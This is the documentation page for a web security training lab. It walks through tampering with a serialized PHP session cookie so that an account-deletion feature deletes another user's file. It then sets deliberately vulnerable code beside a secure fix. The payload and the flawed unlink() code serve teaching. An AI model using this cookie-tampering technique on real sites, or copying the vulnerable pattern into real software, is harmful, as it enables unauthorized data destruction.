<?php
/**
 * Lab 03: Using Application Functionality to Exploit Insecure Deserialization
 * Technical Documentation
 */
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Documentation - Lab 03</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0f0a 100%); 
            min-height: 100vh; 
            color: #e0e0e0; 
        }
        .header { 
            background: rgba(255,255,255,0.05); 
            backdrop-filter: blur(10px); 
            border-bottom: 1px solid rgba(249,115,22,0.3); 
            padding: 1rem 2rem; 
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .header-content { 
            max-width: 1200px; 
            margin: 0 auto; 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
        }
        .logo { 
            font-size: 1.8rem; 
            font-weight: bold; 
            color: #f97316; 
            text-decoration: none; 
        }
        .nav-links { 
            display: flex; 
            gap: 2rem; 
            align-items: center; 
        }
        .nav-links a { 
            color: #e0e0e0; 
            text-decoration: none; 
            font-weight: 500; 
            transition: color 0.3s; 
        }
        .nav-links a:hover { color: #f97316; }
        .container { 
            max-width: 1000px; 
            margin: 0 auto; 
            padding: 3rem 2rem; 
        }
        .doc-title {
            font-size: 2.5rem;
            color: #f97316;
            margin-bottom: 0.5rem;
        }
        .doc-subtitle {
            color: #888;
            margin-bottom: 3rem;
        }
        .toc {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(249,115,22,0.2);
            border-radius: 15px;
            padding: 2rem;
            margin-bottom: 3rem;
        }
        .toc h2 {
            color: #f97316;
            margin-bottom: 1rem;
        }
        .toc ul {
            list-style: none;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 0.5rem;
        }
        .toc a {
            color: #fb923c;
            text-decoration: none;
            padding: 0.5rem 1rem;
            display: block;
            border-radius: 8px;
            transition: background 0.3s;
        }
        .toc a:hover {
            background: rgba(249,115,22,0.1);
        }
        .section {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(249,115,22,0.15);
            border-radius: 15px;
            padding: 2.5rem;
            margin-bottom: 2rem;
        }
        .section h2 {
            color: #f97316;
            margin-bottom: 1.5rem;
            padding-bottom: 0.5rem;
            border-bottom: 1px solid rgba(249,115,22,0.2);
        }
        .section h3 {
            color: #fb923c;
            margin: 1.5rem 0 1rem;
        }
        .section p {
            color: #ccc;
            line-height: 1.8;
            margin-bottom: 1rem;
        }
        .section code {
            background: rgba(249,115,22,0.2);
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            color: #fb923c;
            font-family: 'Consolas', monospace;
        }
        pre {
            background: rgba(0,0,0,0.4);
            border: 1px solid rgba(249,115,22,0.3);
            border-radius: 10px;
            padding: 1.25rem;
            overflow-x: auto;
            margin: 1rem 0;
        }
        pre code {
            background: none;
            padding: 0;
            color: #e0e0e0;
            font-size: 0.9rem;
            line-height: 1.6;
        }
        .comment { color: #6b7280; }
        .keyword { color: #c084fc; }
        .string { color: #86efac; }
        .function { color: #60a5fa; }
        .variable { color: #fbbf24; }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 1rem 0;
        }
        th, td {
            padding: 0.75rem;
            text-align: left;
            border: 1px solid rgba(249,115,22,0.2);
        }
        th {
            background: rgba(249,115,22,0.1);
            color: #f97316;
        }
        td {
            background: rgba(0,0,0,0.2);
            color: #ccc;
        }
        .danger-box {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            padding: 1.25rem;
            border-radius: 10px;
            margin: 1rem 0;
        }
        .danger-box strong { color: #ef4444; }
        .success-box {
            background: rgba(34, 197, 94, 0.1);
            border: 1px solid rgba(34, 197, 94, 0.3);
            padding: 1.25rem;
            border-radius: 10px;
            margin: 1rem 0;
        }
        .success-box strong { color: #22c55e; }
        .hint-box {
            background: rgba(0, 255, 255, 0.05);
            border: 1px solid rgba(0, 255, 255, 0.2);
            padding: 1.25rem;
            border-radius: 10px;
            margin: 1rem 0;
        }
        .hint-box strong { color: #00ffff; }
        .comparison-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1rem;
            margin: 1rem 0;
        }
        .comparison-card {
            padding: 1.5rem;
            border-radius: 10px;
        }
        .comparison-card.vulnerable {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
        .comparison-card.secure {
            background: rgba(34, 197, 94, 0.1);
            border: 1px solid rgba(34, 197, 94, 0.3);
        }
        .comparison-card.vulnerable h4 { color: #ef4444; }
        .comparison-card.secure h4 { color: #22c55e; }
        .back-link {
            display: inline-block;
            color: #f97316;
            text-decoration: none;
            margin-bottom: 2rem;
        }
        .back-link:hover { text-decoration: underline; }
        @media (max-width: 768px) {
            .comparison-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <a href="index.php" class="logo">AvatarVault</a>
            <nav class="nav-links">
                <a href="index.php">Home</a>
                <a href="login.php">Login</a>
                <a href="lab-description.php">Lab Info</a>
                <a href="docs.php" style="color: #f97316;">Docs</a>
            </nav>
        </div>
    </header>

    <div class="container">
        <a href="index.php" class="back-link">← Back to Lab</a>
        
        <h1 class="doc-title">Lab 03: Technical Documentation</h1>
        <p class="doc-subtitle">Using Application Functionality to Exploit Insecure Deserialization</p>

        <!-- Table of Contents -->
        <div class="toc">
            <h2>Table of Contents</h2>
            <ul>
                <li><a href="#overview">1. Overview</a></li>
                <li><a href="#walkthrough">2. Step-by-Step Walkthrough</a></li>
                <li><a href="#why-it-works">3. Why The Exploit Works</a></li>
                <li><a href="#vulnerable-code">4. Vulnerable Code Analysis</a></li>
                <li><a href="#secure-code">5. Secure Implementation</a></li>
                <li><a href="#comparison">6. Code Comparison</a></li>
            </ul>
        </div>

        <!-- Section 1: Overview -->
        <section id="overview" class="section">
            <h2>1. Lab Overview</h2>
            
            <h3>Vulnerability Type</h3>
            <p>
                This lab demonstrates <strong>Arbitrary File Deletion via Insecure Deserialization</strong>. 
                The application uses serialized PHP objects in session cookies to store user data, 
                including the path to the user's avatar file. When the account deletion feature is 
                triggered, the server deletes whatever file is specified in the deserialized 
                <code>avatar_link</code> attribute.
            </p>

            <h3>Attack Surface</h3>
            <table>
                <tr>
                    <th>Component</th>
                    <th>Description</th>
                </tr>
                <tr>
                    <td>Session Cookie</td>
                    <td>Contains serialized <code>User</code> object with <code>avatar_link</code></td>
                </tr>
                <tr>
                    <td>Delete Account Feature</td>
                    <td>Deletes user's avatar file using path from cookie</td>
                </tr>
                <tr>
                    <td>Target File</td>
                    <td><code>[LAB_PATH]/home/carlos/morale.txt</code> (absolute path required)</td>
                </tr>
            </table>

            <h3>Backend Logic</h3>
            <p>
                When a user logs in, the server creates a serialized <code>User</code> object containing 
                their username and avatar file path. This is stored in a Base64-encoded cookie. When 
                the user requests account deletion, the server:
            </p>
            <ol style="margin-left: 1.5rem; color: #ccc; line-height: 2;">
                <li>Reads and deserializes the session cookie</li>
                <li>Extracts the <code>avatar_link</code> from the deserialized object</li>
                <li>Deletes the file at that path using <code>unlink()</code></li>
                <li>Deletes the user's database record</li>
            </ol>

            <div class="danger-box">
                <strong>The Flaw:</strong> The server trusts the <code>avatar_link</code> from the 
                client-controlled cookie instead of fetching it from the database. An attacker can 
                modify this path to delete any file the web server can access.
            </div>
        </section>

        <!-- Section 2: Walkthrough -->
        <section id="walkthrough" class="section">
            <h2>2. Step-by-Step Walkthrough</h2>

            <h3>Step 1: Login and Observe Cookie</h3>
            <p>Login with <code>wiener:peter</code> and examine the session cookie on the My Account page:</p>
            <pre><code><span class="comment"># Base64-encoded cookie value (example)</span>
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMToiYXZhdGFyX2xp...

<span class="comment"># Decoded (serialized PHP object) - NOTE THE ABSOLUTE PATH!</span>
O:4:"User":2:{s:8:"username";s:6:"wiener";s:11:"avatar_link";s:XX:"C:\xampp\htdocs\...\Lab-03/home/wiener/avatar.jpg";}</code></pre>

            <div class="hint-box">
                <strong>Important:</strong> The <code>avatar_link</code> uses the FULL ABSOLUTE PATH on the server.
                You must use the same base path when targeting Carlos's file.
            </div>

            <h3>Step 2: Understand the Structure</h3>
            <pre><code>O:4:"User":2:{
  s:8:"username";s:6:"wiener";
  s:11:"avatar_link";s:XX:"C:\xampp\htdocs\...\Lab-03/home/wiener/avatar.jpg";
}

<span class="comment"># Object breakdown:</span>
<span class="comment"># O:4:"User" - Object of class "User" (4 chars)</span>
<span class="comment"># 2:{...} - Object has 2 properties</span>
<span class="comment"># s:11:"avatar_link" - Property name (11 chars)</span>
<span class="comment"># s:XX:"..." - Property value (XX = string length) ← ATTACK TARGET</span></code></pre>

            <h3>Step 3: Craft the Payload</h3>
            <p>Modify <code>avatar_link</code> to point to Carlos's file (keep the same base path!):</p>
            <pre><code><span class="comment"># Original avatar_link (example - your path will vary)</span>
s:11:"avatar_link";s:75:"C:\xampp\htdocs\LABx_Docs\Insecure-Deserialization\Lab-03/home/wiener/avatar.jpg"

<span class="comment"># Modified avatar_link - replace /home/wiener/avatar.jpg with /home/carlos/morale.txt</span>
s:11:"avatar_link";s:76:"C:\xampp\htdocs\LABx_Docs\Insecure-Deserialization\Lab-03/home/carlos/morale.txt"

<span class="comment"># IMPORTANT: Count the new path length and update s:XX accordingly!</span></code></pre>

            <h3>Step 4: Encode and Replace Cookie</h3>
            <pre><code><span class="comment"># Build your full payload with the ABSOLUTE path</span>
<span class="comment"># Example (adjust path length s:XX to match your actual path!):</span>
O:4:"User":2:{s:8:"username";s:6:"wiener";s:11:"avatar_link";s:76:"C:\xampp\htdocs\LABx_Docs\Insecure-Deserialization\Lab-03/home/carlos/morale.txt";}

<span class="comment"># Base64 encode the payload</span>
<span class="comment"># In PowerShell:</span>
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('YOUR_PAYLOAD_HERE'))

<span class="comment"># Or use an online Base64 encoder</span></code></pre>

            <h3>Step 5: Trigger Account Deletion</h3>
            <p>Replace the session cookie with the modified payload and click "Delete My Account". 
               The server will:</p>
            <ol style="margin-left: 1.5rem; color: #ccc; line-height: 2;">
                <li>Deserialize your modified cookie</li>
                <li>Read <code>avatar_link</code> = <code>C:\...\Lab-03/home/carlos/morale.txt</code></li>
                <li>Delete <code>morale.txt</code> (thinking it's your avatar!)</li>
                <li>Delete your user account</li>
            </ol>

            <div class="success-box">
                <strong>Success!</strong> Lab completed. Carlos's morale.txt has been deleted 
                through the account deletion feature.
            </div>
        </section>

        <!-- Section 3: Why It Works -->
        <section id="why-it-works" class="section">
            <h2>3. Why The Exploit Works</h2>

            <h3>The Trust Issue</h3>
            <p>
                The fundamental flaw is that the server trusts client-controlled data for a sensitive 
                file operation. The <code>avatar_link</code> used for file deletion comes from the 
                deserialized session cookie, not from the server's database.
            </p>

            <h3>Attack Flow Diagram</h3>
            <pre><code>                Attacker modifies cookie
                         |
                         v
              +----------------------+
              | Session Cookie       |
              | avatar_link:         |
              | /home/carlos/        |
              | morale.txt           |
              +----------------------+
                         |
                         v
                  POST /delete-account
                         |
                         v
              +----------------------+
              | Server deserializes  |
              | cookie and extracts  |
              | avatar_link          |
              +----------------------+
                         |
                         v
              +----------------------+
              | unlink(avatar_link)  |
              | Deletes morale.txt!  |
              +----------------------+
                         |
                         v
              +----------------------+
              | User account deleted |
              | from database        |
              +----------------------+</code></pre>

            <h3>Root Cause</h3>
            <div class="danger-box">
                <strong>The server uses client-provided data for file system operations.</strong>
                <ol style="margin-left: 1.5rem; margin-top: 0.5rem; color: #fca5a5;">
                    <li>Avatar path stored in session cookie (client-controlled)</li>
                    <li>No validation of the file path during account deletion</li>
                    <li>No authorization check (is this the user's file?)</li>
                    <li><code>unlink()</code> called on user-controlled path</li>
                </ol>
            </div>
        </section>

        <!-- Section 4: Vulnerable Code -->
        <section id="vulnerable-code" class="section">
            <h2>4. Vulnerable Code Analysis</h2>

            <h3>The Vulnerable Function</h3>
            <pre><code><span class="keyword">function</span> <span class="function">deleteUserAccount</span>(<span class="variable">$sessionData</span>) {
    <span class="keyword">if</span> (!<span class="variable">$sessionData</span> || !<span class="keyword">isset</span>(<span class="variable">$sessionData</span>->username)) {
        <span class="keyword">return</span> [<span class="string">'success'</span> => <span class="keyword">false</span>, <span class="string">'message'</span> => <span class="string">'Invalid session'</span>];
    }
    
    <span class="keyword">try</span> {
        <span class="variable">$pdo</span> = <span class="function">getDBConnection</span>();
        
        <span class="comment">// Check if user exists</span>
        <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-><span class="function">prepare</span>(<span class="string">"SELECT id FROM users WHERE username = ?"</span>);
        <span class="variable">$stmt</span>-><span class="function">execute</span>([<span class="variable">$sessionData</span>->username]);
        <span class="variable">$user</span> = <span class="variable">$stmt</span>-><span class="function">fetch</span>();
        
        <span class="keyword">if</span> (!<span class="variable">$user</span>) {
            <span class="keyword">return</span> [<span class="string">'success'</span> => <span class="keyword">false</span>, <span class="string">'message'</span> => <span class="string">'User not found'</span>];
        }
        
        <span class="comment" style="color: #ef4444;">// VULNERABLE: Uses avatar_link from COOKIE, not database!</span>
        <span class="variable" style="background: rgba(239,68,68,0.3);">$avatarPath</span> = <span class="variable">$sessionData</span>->avatar_link;
        
        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$avatarPath</span>) && <span class="function">file_exists</span>(<span class="variable">$avatarPath</span>)) {
            <span class="comment" style="color: #ef4444;">// DANGEROUS: Deletes ANY file specified in cookie!</span>
            <span class="function" style="background: rgba(239,68,68,0.3);">unlink</span>(<span class="variable">$avatarPath</span>);
        }
        
        <span class="comment">// Delete user from database</span>
        <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-><span class="function">prepare</span>(<span class="string">"DELETE FROM users WHERE username = ?"</span>);
        <span class="variable">$stmt</span>-><span class="function">execute</span>([<span class="variable">$sessionData</span>->username]);
        
        <span class="keyword">return</span> [<span class="string">'success'</span> => <span class="keyword">true</span>];
    } <span class="keyword">catch</span> (Exception <span class="variable">$e</span>) {
        <span class="keyword">return</span> [<span class="string">'success'</span> => <span class="keyword">false</span>];
    }
}</code></pre>

            <h3>Line-by-Line Issues</h3>
            <table>
                <tr>
                    <th>Line</th>
                    <th>Issue</th>
                </tr>
                <tr>
                    <td><code>$avatarPath = $sessionData->avatar_link</code></td>
                    <td>Gets file path from deserialized cookie (client-controlled)</td>
                </tr>
                <tr>
                    <td><code>file_exists($avatarPath)</code></td>
                    <td>No validation that path is within allowed directory</td>
                </tr>
                <tr>
                    <td><code>unlink($avatarPath)</code></td>
                    <td>Deletes any file the attacker specifies</td>
                </tr>
            </table>
        </section>

        <!-- Section 5: Secure Code -->
        <section id="secure-code" class="section">
            <h2>5. Secure Implementation</h2>

            <h3>Fixed Version</h3>
            <pre><code><span class="keyword">function</span> <span class="function">deleteUserAccountSecure</span>(<span class="variable">$sessionData</span>) {
    <span class="keyword">if</span> (!<span class="variable">$sessionData</span> || !<span class="keyword">isset</span>(<span class="variable">$sessionData</span>->username)) {
        <span class="keyword">return</span> [<span class="string">'success'</span> => <span class="keyword">false</span>, <span class="string">'message'</span> => <span class="string">'Invalid session'</span>];
    }
    
    <span class="keyword">try</span> {
        <span class="variable">$pdo</span> = <span class="function">getDBConnection</span>();
        
        <span class="comment" style="color: #22c55e;">// FIX 1: Get avatar_link from DATABASE, not cookie!</span>
        <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-><span class="function">prepare</span>(<span class="string">"SELECT id, avatar_link FROM users WHERE username = ?"</span>);
        <span class="variable">$stmt</span>-><span class="function">execute</span>([<span class="variable">$sessionData</span>->username]);
        <span class="variable">$user</span> = <span class="variable">$stmt</span>-><span class="function">fetch</span>(PDO::FETCH_ASSOC);
        
        <span class="keyword">if</span> (!<span class="variable">$user</span>) {
            <span class="keyword">return</span> [<span class="string">'success'</span> => <span class="keyword">false</span>, <span class="string">'message'</span> => <span class="string">'User not found'</span>];
        }
        
        <span class="comment" style="color: #22c55e;">// FIX 2: Use avatar_link from trusted database</span>
        <span class="variable" style="background: rgba(34,197,94,0.3);">$avatarPath</span> = <span class="variable">$user</span>[<span class="string">'avatar_link'</span>];
        
        <span class="comment" style="color: #22c55e;">// FIX 3: Validate path is within allowed directory</span>
        <span class="variable">$allowedDir</span> = <span class="function">realpath</span>(__DIR__ . <span class="string">'/uploads'</span>);
        <span class="variable">$resolvedPath</span> = <span class="function">realpath</span>(<span class="variable">$avatarPath</span>);
        
        <span class="keyword">if</span> (<span class="variable">$resolvedPath</span> && <span class="function">strpos</span>(<span class="variable">$resolvedPath</span>, <span class="variable">$allowedDir</span>) === <span class="keyword">0</span>) {
            <span class="comment" style="color: #22c55e;">// Safe to delete - file is within allowed directory</span>
            <span class="function">unlink</span>(<span class="variable">$resolvedPath</span>);
        }
        
        <span class="comment">// Delete user from database</span>
        <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-><span class="function">prepare</span>(<span class="string">"DELETE FROM users WHERE username = ?"</span>);
        <span class="variable">$stmt</span>-><span class="function">execute</span>([<span class="variable">$sessionData</span>->username]);
        
        <span class="keyword">return</span> [<span class="string">'success'</span> => <span class="keyword">true</span>];
    } <span class="keyword">catch</span> (Exception <span class="variable">$e</span>) {
        <span class="keyword">return</span> [<span class="string">'success'</span> => <span class="keyword">false</span>];
    }
}</code></pre>

            <h3>Security Measures Explained</h3>
            <table>
                <tr>
                    <th>Fix</th>
                    <th>Description</th>
                </tr>
                <tr>
                    <td>Database Source</td>
                    <td>Get <code>avatar_link</code> from database, not cookie</td>
                </tr>
                <tr>
                    <td>Path Validation</td>
                    <td>Use <code>realpath()</code> to resolve and validate path</td>
                </tr>
                <tr>
                    <td>Directory Restriction</td>
                    <td>Ensure file is within allowed <code>/uploads</code> directory</td>
                </tr>
                <tr>
                    <td>Prefix Check</td>
                    <td><code>strpos() === 0</code> ensures path starts with allowed dir</td>
                </tr>
            </table>
        </section>

        <!-- Section 6: Comparison -->
        <section id="comparison" class="section">
            <h2>6. Code Comparison</h2>

            <div class="comparison-grid">
                <div class="comparison-card vulnerable">
                    <h4>❌ Vulnerable Code</h4>
                    <pre><code><span class="comment">// Gets path from cookie</span>
<span class="variable">$avatarPath</span> = <span class="variable">$sessionData</span>->avatar_link;

<span class="comment">// No validation!</span>
<span class="function">unlink</span>(<span class="variable">$avatarPath</span>);</code></pre>
                </div>
                <div class="comparison-card secure">
                    <h4>✓ Secure Code</h4>
                    <pre><code><span class="comment">// Gets path from database</span>
<span class="variable">$avatarPath</span> = <span class="variable">$user</span>[<span class="string">'avatar_link'</span>];

<span class="comment">// Validates path first</span>
<span class="keyword">if</span> (<span class="function">isAllowedPath</span>(<span class="variable">$avatarPath</span>)) {
    <span class="function">unlink</span>(<span class="variable">$avatarPath</span>);
}</code></pre>
                </div>
            </div>

            <h3>Key Differences</h3>
            <table>
                <tr>
                    <th>Aspect</th>
                    <th>Vulnerable</th>
                    <th>Secure</th>
                </tr>
                <tr>
                    <td>Data Source</td>
                    <td>Client cookie</td>
                    <td>Server database</td>
                </tr>
                <tr>
                    <td>Path Validation</td>
                    <td>None</td>
                    <td><code>realpath()</code> + prefix check</td>
                </tr>
                <tr>
                    <td>Directory Restriction</td>
                    <td>None</td>
                    <td>Only <code>/uploads</code></td>
                </tr>
                <tr>
                    <td>Attack Result</td>
                    <td>Any file deleted</td>
                    <td>Attack blocked</td>
                </tr>
            </table>

            <div class="hint-box">
                <strong>Defense in Depth:</strong> Even better security would include:
                <ul style="margin-left: 1.5rem; margin-top: 0.5rem; color: #a0e0e0;">
                    <li>Store only filename in database, construct full path on server</li>
                    <li>Use signed/encrypted cookies to prevent tampering</li>
                    <li>Implement file ownership tracking in database</li>
                    <li>Run web server with minimal file system permissions</li>
                </ul>
            </div>
        </section>
    </div>
</body>
</html>
